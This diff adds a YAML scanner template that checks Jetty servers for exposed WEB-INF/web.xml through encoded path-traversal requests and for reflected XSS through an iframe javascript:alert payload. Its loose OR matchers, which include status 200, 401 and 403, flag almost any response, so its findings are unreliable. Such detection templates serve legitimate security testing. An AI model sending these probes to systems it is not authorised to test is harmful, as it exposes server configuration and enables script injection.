@@ -1,0 +1,55 @@
+id: jetty-misconfig
+info:
+  name: Jetty Misconfiguration Detection
+  author: pwn
+  severity: high
+  description: Detects exposed Jetty instances with accessible sensitive endpoints or vulnerable to path traversal/XSS.
+  tags: jetty, misconfiguration, path-traversal, xss
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/%2e/WEB-INF/web.xml"
+      - "{{BaseURL}}/%u002e/WEB-INF/web.xml"
+      - "{{BaseURL}}/.%00/WEB-INF/web.xml"
+      - "{{BaseURL}}/..;/%22%3E%3Ciframe/src=javascript:alert(1)%3E"
+      - "{{BaseURL}}:8080/%2e/WEB-INF/web.xml"
+      - "{{BaseURL}}:8080/%u002e/WEB-INF/web.xml"
+      - "{{BaseURL}}:8080/.%00/WEB-INF/web.xml"
+      - "{{BaseURL}}:8080/..;/%22%3E%3Ciframe/src=javascript:alert(1)%3E"
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "Jetty"
+          - "<web-app"
+          - "alert(1)"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: word
+        words:
+          - "Server: Jetty"
+        part: header
+        condition: or
+        case-insensitive: true
+      - type: word
+        words:
+          - "Jetty"
+        part: body
+        condition: or
+        case-insensitive: true
+      - type: status
+        status:
+          - 403
+          - 401
+    extractors:
+      - type: regex
+        name: matched_path
+        part: request
+        regex:
+          - "https?://[^/]+(/.*)"
+        group: 1
